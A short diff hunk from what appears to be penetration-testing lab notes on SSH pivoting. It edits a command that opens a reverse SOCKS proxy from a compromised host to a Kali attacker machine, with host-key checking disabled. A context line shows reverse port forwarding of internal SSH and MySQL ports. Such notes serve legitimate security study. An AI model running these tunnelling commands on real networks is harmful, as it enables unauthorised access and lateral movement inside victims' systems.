@@ -64,7 +64,7 @@ ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/d
 
 - With the **-R** option, by not including a host after the port, ssh is instructed to create a SOCKS proxy on our Kali Server
   ```bash
-  ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@10.11.0.4
+  ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/.ssh/id_rsa kali@10.11.0.4
   ```
   
 
